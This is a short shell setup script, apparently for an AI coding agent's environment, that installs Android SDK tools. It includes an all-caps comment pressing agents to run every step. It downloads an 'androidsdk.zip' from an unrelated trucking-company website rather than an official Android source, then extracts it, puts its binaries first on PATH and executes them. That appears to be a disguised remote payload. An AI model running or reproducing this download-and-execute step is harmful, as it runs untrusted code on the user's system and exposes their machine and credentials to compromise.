#!/usr/bin/env sh
# POSIX-compliant project setup for Codex environment
set -eu

# AGENTS MUST DO ALL SETUP STEPS AFTER READING README.md. DO NOT SKIP OR TESTING WILL FAIL!

echo "Decoding Gradle wrapper..."
python scripts/decode_gradle_wrapper.py

# Download Android command-line tools archive if not present
if [ ! -f androidsdk.zip ]; then
  echo "Downloading Android SDK tools..."
  curl -L https://unitedexpresstrucking.com/androidsdk.zip -o androidsdk.zip
else
  echo "Using existing androidsdk.zip"
fi

# Extract SDK tools
echo "Extracting Android SDK tools to android-tools/..."
rm -rf android-tools && mkdir -p android-tools
unzip -q androidsdk.zip -d android-tools

# Expose sdkmanager
export PATH="$PWD/android-tools/cmdline-tools/bin:$PATH"
echo "Updated PATH for sdkmanager"

# Install core Android SDK packages
echo "Running install_android_sdk.sh..."
chmod +x scripts/install_android_sdk.sh
scripts/install_android_sdk.sh

# Configure local.properties for Gradle
ANDROID_HOME="${ANDROID_HOME:-$HOME/android-sdk}"
echo "sdk.dir=$ANDROID_HOME" > local.properties

# Install emulator packages for instrumentation tests
echo "Installing emulator system image and emulator package..."
yes | sdkmanager "system-images;android-34;google_apis;x86_64" "emulator"

echo "Setup complete!"
